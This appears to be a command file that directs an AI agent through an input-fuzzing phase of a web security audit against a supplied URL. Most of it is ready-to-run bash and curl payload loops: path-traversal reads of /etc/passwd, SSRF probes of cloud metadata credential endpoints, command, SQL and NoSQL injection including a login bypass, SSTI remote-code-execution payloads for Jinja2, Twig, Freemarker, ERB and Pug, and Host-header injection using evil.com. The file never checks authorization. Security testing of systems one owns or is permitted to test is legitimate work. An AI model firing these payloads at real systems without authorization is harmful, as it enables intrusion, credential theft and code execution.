---
description: "Phase 7b: Input fuzzing — LFI, SSRF, command injection, XSS probes"
argument-hint: <url>
allowed-tools: [Bash, WebFetch, Write, Edit, Read]
---

# Phase 7b: Input Fuzzing

**Target:** $ARGUMENTS

**Goal:** Test for common injection vulnerabilities by sending crafted payloads to discovered endpoints. This phase covers what automated scanners like Nuclei test with thousands of templates — we focus on the highest-impact patterns adapted to the target's stack.

**When to run:** After Phases 1, 5, and 7 have identified the technology stack, API endpoints, and form handlers.

**Ledger:** `Read` the findings ledger from `audits/{domain}/ledger.md` before starting. After this phase completes, `Edit` the ledger to update Phase 7b status, add confirmed findings, chain candidates, and failed techniques.

## Output Verification Rules (Anti-Hallucination)

This phase is the most prone to false positives. For every test:

1. **Show the raw response** — include at least the relevant portion (status code, body snippet, timing). Never say "the endpoint is vulnerable" without showing what the response actually contained.
2. **Match against specific vulnerability indicators** — each test section below defines what "vulnerable" looks like. A 200 response alone is NOT confirmation. An error page alone is NOT confirmation. You need the specific indicator.
3. **Distinguish between "reflected" and "executed"** — finding your payload string in the response (reflection) does NOT mean it executes. XSS requires browser verification. SQLi requires database behavior. SSTI requires expression evaluation.
4. **Time-based tests need a baseline** — before testing `sleep 5` payloads, measure the normal response time. If the endpoint already takes 4 seconds, a 5-second response means nothing. The delay must be significantly above baseline AND consistent across retries.
5. **Report negatives clearly** — "Tested 6 LFI payloads against /api/search — all returned 400 with `invalid parameter` error. **Not vulnerable.**" is valuable. Silence on what was tested breeds doubt.

---

## 7b.1 — Local File Inclusion (LFI)

**Test every endpoint that accepts a path, filename, page, or template parameter:**

```bash
# Common LFI payloads — test on every parameter that takes a path-like value
for payload in \
  "../../../../etc/passwd" \
  "....//....//....//....//etc/passwd" \
  "..%2f..%2f..%2f..%2fetc/passwd" \
  "..%252f..%252f..%252f..%252fetc/passwd" \
  "/etc/passwd" \
  "....\\....\\....\\....\\windows\\win.ini"; do

  # Substitute into every discovered parameter
  curl -s "https://{target}/{endpoint}?file=$payload" 2>&1 | head -5
  curl -s "https://{target}/{endpoint}?page=$payload" 2>&1 | head -5
  curl -s "https://{target}/{endpoint}?path=$payload" 2>&1 | head -5
  curl -s "https://{target}/{endpoint}?template=$payload" 2>&1 | head -5
done
```

**Vulnerable if:** Response contains `root:x:0:0` (Linux) or `[extensions]` (Windows win.ini).

**Also check for source file read:**
```bash
# PHP source disclosure
curl -s "https://{target}/index.php?page=php://filter/convert.base64-encode/resource=index"
# Node.js
curl -s "https://{target}/?file=../package.json"
# Python
curl -s "https://{target}/?page=../requirements.txt"
```

---

## 7b.2 — Server-Side Request Forgery (SSRF)

**Test any parameter that accepts a URL, webhook, callback, or redirect:**

```bash
# Internal network probing
for target_url in \
  "http://127.0.0.1" \
  "http://localhost" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://metadata.google.internal/computeMetadata/v1/" \
  "http://169.254.169.254/metadata/v1/" \
  "http://[::1]" \
  "http://0.0.0.0"; do

  curl -s "https://{target}/{endpoint}?url=$target_url" 2>&1 | head -10
done
```

**Cloud metadata endpoints (CRITICAL if accessible):**

| Cloud | Metadata URL | What it leaks |
|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | IAM credentials, instance role, region |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` (needs `Metadata-Flavor: Google` header) | Service account tokens, project ID |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs `Metadata: true` header) | Subscription ID, resource group |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | Droplet metadata, auth tokens |

**Also test via redirect bypass:**
```bash
# Some SSRF filters check the URL but follow redirects
curl -s "https://{target}/{endpoint}?url=https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
```

---

## 7b.3 — Command Injection

**Test parameters that might be passed to shell commands (ping, nslookup, curl, wget, file converters, PDF generators):**

```bash
# Time-based detection (safest — doesn't modify anything)
for payload in \
  "; sleep 5" \
  "| sleep 5" \
  "\$(sleep 5)" \
  "\`sleep 5\`" \
  "& sleep 5 &" \
  "%0a sleep 5"; do

  start=$(date +%s)
  curl -s "https://{target}/{endpoint}?input=${payload}" --max-time 10 > /dev/null 2>&1
  elapsed=$(( $(date +%s) - start ))
  if [ "$elapsed" -ge 5 ]; then
    echo "!!! POSSIBLE COMMAND INJECTION: $payload (${elapsed}s delay)"
  fi
done
```

**Vulnerable if:** Response takes 5+ seconds (indicates `sleep` executed on the server).

**Common injection points:**
- PDF generators (URL → PDF, HTML → PDF)
- Image processors (ImageMagick)
- File upload with filename processing
- Export functions (CSV, Excel)
- Ping/network diagnostic tools
- Search features that shell out to grep

---

## 7b.4 — Cross-Site Scripting (XSS) Reflection Probes

**Test for reflected XSS in parameters that echo user input:**

```bash
# Canary injection — look for reflection without execution
canary="sec4udit<>'\""
for param in "q" "search" "query" "name" "email" "redirect" "url" "callback" "next" "ref"; do
  response=$(curl -s "https://{target}/?${param}=${canary}" 2>&1)
  if echo "$response" | grep -q "sec4udit<>"; then
    echo "!!! REFLECTED (unencoded): parameter '$param'"
  elif echo "$response" | grep -q "sec4udit"; then
    echo "REFLECTED (may be encoded): parameter '$param'"
  fi
done
```

**If reflection is found, test escalation:**
```bash
# Test if script tags execute
curl -s "https://{target}/?{param}=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'
# Test event handler injection
curl -s "https://{target}/?{param}=\"onmouseover=alert(1)\"" | grep -o 'onmouseover'
# Test SVG injection
curl -s "https://{target}/?{param}=<svg/onload=alert(1)>" | grep -o 'svg/onload'
```

**Note:** XSS confirmation requires browser testing. If curl shows unencoded reflection, verify in a real browser (use browser automation tools if available) to confirm the payload executes.

---

## 7b.5 — HTTP Header Injection

**Test for header injection via parameters used in redirects or Set-Cookie:**

```bash
# CRLF injection test
curl -sI "https://{target}/redirect?url=https://example.com%0d%0aInjected-Header:%20true" | grep -i "injected-header"

# Host header injection
curl -sI "https://{target}/" -H "Host: evil.com" | grep -i "evil.com"
curl -sI "https://{target}/" -H "X-Forwarded-Host: evil.com" | grep -i "evil.com"
```

**Vulnerable if:** The injected header appears in the response, or the Host/X-Forwarded-Host value appears in page content (password reset poisoning, cache poisoning).

---

## 7b.6 — Open Redirect

**Test parameters that control redirects:**

```bash
for param in "redirect" "url" "next" "return" "returnTo" "goto" "redirect_uri" "continue" "dest" "destination" "rurl" "target"; do
  code=$(curl -sI -o /dev/null -w "%{http_code}" "https://{target}/?${param}=https://evil.com" --max-time 5 2>/dev/null)
  location=$(curl -sI "https://{target}/?${param}=https://evil.com" 2>/dev/null | grep -i "^location:" | head -1)
  if echo "$location" | grep -qi "evil.com"; then
    echo "!!! OPEN REDIRECT: parameter '$param' -> $location"
  fi
done
```

**Why it matters:** Open redirects are used in phishing (victim clicks a legitimate-looking URL that redirects to an attacker page) and OAuth token theft.

---

## 7b.7 — Prototype Pollution (JavaScript apps)

**For Node.js/Express backends and JavaScript SPAs:**

```bash
# Server-side prototype pollution
curl -s "https://{target}/api/endpoint" -X POST \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -s "https://{target}/api/endpoint" -X POST \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'
```

**Vulnerable if:** The response changes behavior (e.g., returns admin data, bypasses auth, or returns a different status code).

---

## Adapting to the Stack

**Skip irrelevant tests based on Phase 1 findings:**

| Stack | Focus on | Skip |
|---|---|---|
| Static site (Webflow, Squarespace) | XSS reflection, open redirect | LFI, command injection, SSRF |
| Node.js/Express | Prototype pollution, SSRF, command injection (if spawning processes) | PHP-specific LFI |
| PHP/WordPress | LFI, SQL injection, command injection | Prototype pollution |
| Python/Django/Flask | SSRF (common in URL fetch), template injection | PHP-specific payloads |
| Java/Spring | SSRF, SpEL injection, actuator exposure | PHP/Node-specific payloads |
| Next.js/Vercel | SSRF via API routes, open redirect via middleware | LFI (no filesystem access on serverless) |

---

## 7b.8 — SQL Injection

**CRITICAL GAP: SQLi is OWASP #1 and must be tested on every endpoint that accepts user input.**

**Manual detection (safe canary probes):**
```bash
# Error-based detection — look for database errors in responses
for payload in "'" "' OR '1'='1" "1 AND 1=1" "1 AND 1=2" "' UNION SELECT NULL--" "1; SELECT 1--"; do
  for param in "id" "user" "search" "q" "page" "category" "item" "product" "order"; do
    response=$(curl -s "https://{target}/api/endpoint?${param}=${payload}" 2>&1 | head -20)
    if echo "$response" | grep -qiE '(sql syntax|mysql|postgresql|sqlite|oracle|microsoft sql|unclosed quotation|syntax error|ORA-|PG::|SQLSTATE)'; then
      echo "!!! SQL ERROR with param=$param payload=$payload"
      echo "$response" | head -5
    fi
  done
done
```

**Time-based blind detection:**
```bash
# Test if a time delay can be injected (database-agnostic)
for payload in \
  "1' AND SLEEP(3)--" \
  "1' AND pg_sleep(3)--" \
  "1'; WAITFOR DELAY '0:0:3'--" \
  "1' AND (SELECT * FROM (SELECT SLEEP(3))a)--"; do

  start=$(date +%s)
  curl -s "https://{target}/api/endpoint?id=${payload}" --max-time 8 > /dev/null 2>&1
  elapsed=$(( $(date +%s) - start ))
  if [ "$elapsed" -ge 3 ]; then
    echo "!!! POSSIBLE BLIND SQLi: $payload (${elapsed}s delay)"
  fi
done
```

**Automated testing (SQLmap — comprehensive, if installed):**
```bash
if command -v sqlmap &> /dev/null; then
  # Safe, non-destructive scan — level 2 = test more parameters, risk 1 = safe payloads only
  sqlmap -u "https://{target}/api/endpoint?id=1" \
    --batch --level=2 --risk=1 \
    --technique=BEUST \
    --threads=3 \
    --timeout=10 \
    --random-agent \
    2>&1 | tail -30

  # For POST endpoints
  sqlmap -u "https://{target}/api/endpoint" \
    --data='{"id":"1","name":"test"}' \
    --batch --level=2 --risk=1 \
    --content-type="application/json" \
    2>&1 | tail -30
fi
```

**Test every endpoint type:**
- GET parameters (query strings)
- POST JSON body fields
- POST form data fields
- URL path segments (`/api/users/1` → `/api/users/1'`)
- Cookie values
- HTTP headers (Referer, X-Forwarded-For, User-Agent)

---

## 7b.9 — NoSQL Injection

**Trigger:** When the target uses MongoDB, CouchDB, or other NoSQL databases (detected via stack traces, error messages, or technology fingerprinting).

```bash
# MongoDB operator injection
curl -s -X POST "https://{target}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

curl -s -X POST "https://{target}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'

# NoSQL regex injection
curl -s -X POST "https://{target}/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"}}'

# Test via query string (common in Express/Mongoose)
curl -s "https://{target}/api/users?username[\$ne]=nonexistent"
curl -s "https://{target}/api/users?username[\$regex]=.*"
```

**Vulnerable if:** Response returns user data when using `$gt`, `$ne`, or `$regex` operators — indicates MongoDB query injection.

**Automated (NoSQLmap, if installed):**
```bash
if command -v nosqlmap &> /dev/null; then
  nosqlmap -u "https://{target}/api/login" --data '{"username":"test","password":"test"}' --attack 1
fi
```

---

## 7b.10 — Server-Side Template Injection (SSTI)

**Trigger:** When the target uses server-side templating (Jinja2, Twig, Pug, ERB, Freemarker, Velocity, Thymeleaf) — detected via technology fingerprinting or framework identification.

```bash
# Universal SSTI detection payloads — test in every text input field
for payload in \
  '{{7*7}}' \
  '${7*7}' \
  '<%= 7*7 %>' \
  '#{7*7}' \
  '*{7*7}' \
  '{7*7}' \
  '{{config}}' \
  '{{self}}'; do

  response=$(curl -s "https://{target}/api/endpoint?name=${payload}" 2>&1)
  if echo "$response" | grep -q "49"; then
    echo "!!! SSTI CONFIRMED: $payload evaluated to 49"
  fi
  if echo "$response" | grep -qiE '(secret_key|config|debug|database)'; then
    echo "!!! SSTI CONFIG LEAK: $payload exposed configuration"
  fi
done
```

**Framework-specific escalation (if SSTI confirmed):**

| Framework | Detection | RCE payload |
|---|---|---|
| Jinja2 (Python) | `{{7*7}}` = 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` = 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| Freemarker (Java) | `${7*7}` = 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| ERB (Ruby) | `<%= 7*7 %>` = 49 | `<%= system("id") %>` |
| Pug (Node.js) | `#{7*7}` = 49 | `-var x = global.process.mainModule.require('child_process').execSync('id')` |

**Automated (tplmap, if installed):**
```bash
if command -v tplmap &> /dev/null; then
  tplmap -u "https://{target}/api/endpoint?name=test"
fi
```

**Note:** SSTI is particularly dangerous because it often leads directly to Remote Code Execution. If SSTI is confirmed even with simple math expressions, escalate to CRITICAL severity.

---

## 7b.11 — ReDoS (Regular Expression Denial of Service)

**Trigger:** When the target accepts text input that's likely validated with regex (email fields, URL fields, search, pattern matching).

```bash
# Send payloads designed to trigger catastrophic backtracking in common regex patterns
for payload in \
  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" \
  "aaaaaaaaaaaa@aaaaaaaaaaaa.aaaaaaaaaaaa.aaaaaaaaaaaa" \
  "http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
  "((((((((((((((((((((((((((((((((((((((((x"; do

  start=$(date +%s%N 2>/dev/null || date +%s)
  curl -s "https://{target}/api/search?q=${payload}" --max-time 10 > /dev/null 2>&1
  end=$(date +%s%N 2>/dev/null || date +%s)

  # If response takes >5 seconds, regex is likely vulnerable
  elapsed_ms=$(( (end - start) / 1000000 ))
  if [ "$elapsed_ms" -ge 5000 ] 2>/dev/null; then
    echo "!!! POSSIBLE ReDoS: payload caused ${elapsed_ms}ms delay"
  fi
done
```

**Vulnerable if:** Certain long/malformed strings cause significantly longer response times than normal input — indicates the regex engine is in catastrophic backtracking.

---

**Document:** For each test — the payload used, the endpoint tested, the response observed, and whether the vulnerability was confirmed or ruled out. Include exact reproduction commands for any confirmed finding.
